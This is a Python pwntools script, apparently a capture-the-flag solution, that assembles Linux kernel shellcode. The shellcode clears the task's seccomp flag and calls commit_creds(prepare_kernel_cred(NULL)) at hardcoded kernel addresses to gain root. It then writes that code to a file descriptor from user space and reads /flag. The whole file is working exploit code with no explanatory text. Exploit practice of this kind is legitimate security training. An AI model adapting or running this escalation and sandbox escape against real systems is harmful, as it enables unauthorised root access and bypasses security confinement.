import sys
sys.path.append("..")

from pwn import context, shellcraft
from common import *
context(arch = 'amd64', os = 'linux')

kernel_assembly = f"""
/* current->thread_info.flags &= ~(1 << TIF_SECCOMP); */
mov     rdx, gs:0x15d00             /* runtime-relocated offsets */
mov     rax, [rdx]
and     ah, 0xfe
mov     [rdx], rax
/* commit_creds(prepare_kernel_cred(NULL)); */
xor     rdi, rdi
movabs  rsi, 0xffffffff81089660
call    rsi                         /* prepare_kernel_cred */
mov     rdi, rax
movabs  rsi, 0xffffffff81089310
call    rsi                         /* commit_creds */
ret
""".strip()

kernel_machine_code = dump_machine_code(kernel_assembly)

user_assembly = f"""
{shellcraft.amd64.pushstr(kernel_machine_code, append_null=False)}
{shellcraft.amd64.linux.syscall("SYS_write", 3, "rsp", len(kernel_machine_code))}
{shellcraft.amd64.linux.cat("/flag")}
""".strip()

user_machine_code = dump_machine_code(user_assembly)

with open('shellcode.bin', 'wb') as f:
    f.write(user_machine_code)
    f.write(b'\xcc' * (0x1000 - len(user_machine_code)))